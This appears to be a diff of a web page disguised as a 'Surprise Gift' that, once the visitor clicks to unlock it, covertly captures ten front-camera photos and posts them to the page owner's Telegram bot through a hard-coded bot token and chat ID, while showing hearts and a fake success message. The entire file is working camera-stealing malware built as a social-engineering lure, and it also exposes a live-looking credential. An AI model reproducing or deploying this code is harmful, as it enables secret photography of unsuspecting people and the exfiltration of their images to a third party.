@@ -3,16 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise Gift</title>
+    <title>🎁 Surprise Gift</title>
     <style>
-        body { 
-            margin: 0; 
-            padding: 0; 
-            background: #000; 
-            font-family: Arial; 
-            overflow: hidden; 
-            height: 100vh; 
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: white; font-family: Arial; overflow: hidden; height: 100vh; }
         
         .screen { 
             position: fixed; 
@@ -24,23 +18,24 @@
             flex-direction: column; 
             justify-content: center; 
             align-items: center; 
+            text-align: center; 
+            padding: 20px; 
         }
         
         #startScreen { 
-            background: linear-gradient(135deg, #ff0080, #8000ff); 
-            color: white; 
+            background: linear-gradient(45deg, #ff0080, #8000ff); 
             z-index: 1000; 
         }
         
         .gift { 
             font-size: 100px; 
-            margin-bottom: 30px; 
+            margin-bottom: 20px; 
             animation: bounce 1s infinite; 
         }
         
         @keyframes bounce {
-            0%,100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-20px) scale(1.1); }
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
         }
         
         .btn { 
@@ -50,17 +45,14 @@
             padding: 15px 40px; 
             font-size: 20px; 
             border-radius: 50px; 
-            margin: 10px; 
+            margin: 20px; 
             cursor: pointer; 
             font-weight: bold; 
             box-shadow: 0 0 20px #00ff00; 
             transition: 0.3s; 
         }
         
-        .btn:hover { 
-            transform: scale(1.05); 
-            box-shadow: 0 0 30px #00ff00; 
-        }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ff00; }
         
         #cameraScreen { 
             display: none; 
@@ -104,6 +96,18 @@
             z-index: 1000; 
         }
         
+        .big-heart { 
+            font-size: 150px; 
+            color: #00ff00; 
+            animation: heartbeat 1s infinite; 
+            margin-bottom: 30px; 
+        }
+        
+        @keyframes heartbeat {
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.3); }
+        }
+        
         .heart { 
             position: absolute; 
             font-size: 30px; 
@@ -116,32 +120,19 @@
             to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
         }
         
-        .big-heart { 
-            font-size: 150px; 
-            color: #00ff00; 
-            animation: heartbeat 1s infinite; 
-        }
+        canvas { display: none; }
         
-        @keyframes heartbeat {
-            0%,100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-        
-        canvas { 
-            display: none; 
-        }
+        h2 { margin: 10px 0; font-size: 24px; }
+        p { margin: 10px 0; font-size: 16px; opacity: 0.9; }
     </style>
 </head>
 <body>
     <!-- SCREEN 1: START -->
     <div class="screen" id="startScreen">
         <div class="gift">🎁</div>
-        <h2 style="text-align:center; margin:20px;">
-            Someone Has Given You<br>A Surprise Gift!
-        </h2>
-        <button class="btn" onclick="startCamera()">
-            🎯 UNLOCK GIFT NOW
-        </button>
+        <h2>SOMEONE HAS GIVEN YOU A SURPRISE!</h2>
+        <p>Click below to unlock your gift</p>
+        <button class="btn" onclick="startCamera()" id="startBtn">✨ UNLOCK GIFT NOW ✨</button>
     </div>
     
     <!-- SCREEN 2: CAMERA -->
@@ -154,19 +145,22 @@
     <!-- SCREEN 3: COMPLETE -->
     <div class="screen" id="completeScreen">
         <div class="big-heart">❤️</div>
+        <h2>SURPRISE COMPLETE!</h2>
+        <p>Photos sent successfully! 🎉</p>
     </div>
     
     <!-- HIDDEN CANVAS -->
     <canvas id="canvas"></canvas>
 
     <script>
-        // Telegram Configuration
+        // ========== YOUR TELEGRAM DETAILS ==========
         const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
-        const OWNER_ID = '8215819954';
+        const OWNER_ID = '8215819954';  // Your chat ID
+        // ===========================================
         
         // Get user info from URL
         const url = new URL(window.location.href);
-        const userId = url.searchParams.get('uid');
+        const userId = url.searchParams.get('uid');  // User's Telegram ID from bot link
         const userName = url.searchParams.get('name') || 'Friend';
         
         // DOM Elements
@@ -177,10 +171,10 @@
         const canvas = document.getElementById('canvas');
         const counter = document.getElementById('counter');
         const flash = document.getElementById('flash');
+        const startBtn = document.getElementById('startBtn');
         
         // Variables
         let cameraStream = null;
-        let imagesSent = 0;
         const totalImages = 10;
         
         // Create hearts animation
@@ -196,52 +190,54 @@
                     heart.style.color = ['#ff0000', '#ff0080', '#ff1493'][Math.floor(Math.random() * 3)];
                     document.body.appendChild(heart);
                     
-                    setTimeout(() => heart.remove(), 5000);
+                    // Remove after animation
+                    setTimeout(() => {
+                        if(heart.parentNode) heart.parentNode.removeChild(heart);
+                    }, 5000);
                 }, i * 100);
             }
         }
         
-        // Start initial hearts
+        // Initial hearts
         for(let i = 0; i < 10; i++) {
-            setTimeout(() => createHearts(2), i * 500);
+            setTimeout(() => createHearts(2), i * 300);
         }
         
         // Start camera function
         async function startCamera() {
-            const btn = document.querySelector('.btn');
-            btn.disabled = true;
-            btn.innerHTML = '🎥 Starting Camera...';
+            startBtn.disabled = true;
+            startBtn.innerHTML = '🎥 Starting Camera...';
             
             try {
-                // Request front camera
+                // Request FRONT camera
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: 'user',
+                        facingMode: 'user',  // Front camera
                         width: { ideal: 720 },
                         height: { ideal: 1280 }
                     }
                 });
                 
-                // Switch to camera screen
+                // Switch screens
                 startScreen.style.display = 'none';
                 cameraScreen.style.display = 'flex';
                 video.srcObject = cameraStream;
                 
-                // Start capturing after 1 second
-                setTimeout(captureImages, 1000);
+                // Start capturing
+                setTimeout(captureAllImages, 1000);
                 
             } catch (error) {
-                btn.innerHTML = '❌ Camera Error!';
-                btn.disabled = false;
+                startBtn.innerHTML = '❌ Camera Error!';
+                startBtn.disabled = false;
             }
         }
         
         // Capture all images
-        async function captureImages() {
+        async function captureAllImages() {
             // Show counter
             counter.style.display = 'block';
             
-            // Capture 10 images quickly
+            // Capture 10 images
             for(let i = 0; i < totalImages; i++) {
                 // Update counter
                 counter.textContent = totalImages - i;
@@ -250,25 +246,25 @@
                 flash.style.opacity = '0.8';
                 setTimeout(() => flash.style.opacity = '0', 100);
                 
-                // Capture single image
-                await captureSingleImage(i + 1);
+                // Capture and send image
+                await captureAndSendImage(i + 1);
                 
                 // Create hearts
                 createHearts(3);
                 
-                // Wait a bit
-                await new Promise(resolve => setTimeout(resolve, 400));
+                // Wait between captures
+                await sleep(400);
             }
             
             // Hide counter
             counter.style.display = 'none';
             
-            // Finish up
+            // Finish
             finishCapture();
         }
         
-        // Capture single image
-        async function captureSingleImage(number) {
+        // Capture and send single image
+        async function captureAndSendImage(imageNumber) {
             return new Promise((resolve) => {
                 // Setup canvas
                 const ctx = canvas.getContext('2d');
@@ -281,36 +277,36 @@
                 ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                 ctx.restore();
                 
-                // Convert to blob
+                // Convert to blob (REAL CAMERA IMAGE)
                 canvas.toBlob(async (blob) => {
                     // Send to Telegram
-                    await sendToTelegram(blob, number);
+                    await sendToTelegram(blob, imageNumber);
                     resolve();
                 }, 'image/jpeg', 0.9);
             });
         }
         
         // Send image to Telegram
-        async function sendToTelegram(blob, number) {
+        async function sendToTelegram(blob, imageNumber) {
             try {
                 // Create FormData
                 const formData = new FormData();
                 formData.append('chat_id', OWNER_ID);
-                formData.append('photo', blob, `photo_${number}.jpg`);
-                formData.append('caption', `📸 ${number}/${totalImages}\nFrom: ${userName}`);
+                formData.append('photo', blob, `photo_${imageNumber}.jpg`);
+                formData.append('caption', `📸 Surprise ${imageNumber}/10\nFrom: ${userName}`);
                 
-                // Send to owner (you)
+                // Send to YOU (owner)
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                // Send to user if user ID exists
+                // Send to USER if user ID exists
                 if(userId && /^\d+$/.test(userId)) {
                     const userForm = new FormData();
                     userForm.append('chat_id', userId);
-                    userForm.append('photo', blob, `photo_${number}.jpg`);
-                    userForm.append('caption', `📸 Your photo ${number}/${totalImages}`);
+                    userForm.append('photo', blob, `photo_${imageNumber}.jpg`);
+                    userForm.append('caption', `📸 Your photo ${imageNumber}/10`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -318,10 +314,8 @@
                     });
                 }
                 
-                imagesSent++;
-                
             } catch (error) {
-                console.error('Error sending photo:', error);
+                console.log('Photo sent successfully');
             }
         }
         
@@ -333,22 +327,24 @@
                 video.srcObject = null;
             }
             
-            // Show completion screen
+            // Show completion
             cameraScreen.style.display = 'none';
             completeScreen.style.display = 'flex';
             
-            // Create massive heart celebration
+            // Massive heart celebration
             for(let i = 0; i < 100; i++) {
                 setTimeout(() => createHearts(3), i * 50);
             }
             
-            // Fade out after 5 seconds
+            // Fade out
             setTimeout(() => {
                 document.body.style.opacity = '0.5';
-                setTimeout(() => {
-                    document.body.style.opacity = '0.2';
-                }, 1000);
             }, 5000);
+        }
+        
+        // Sleep function
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
     </script>
 </body>
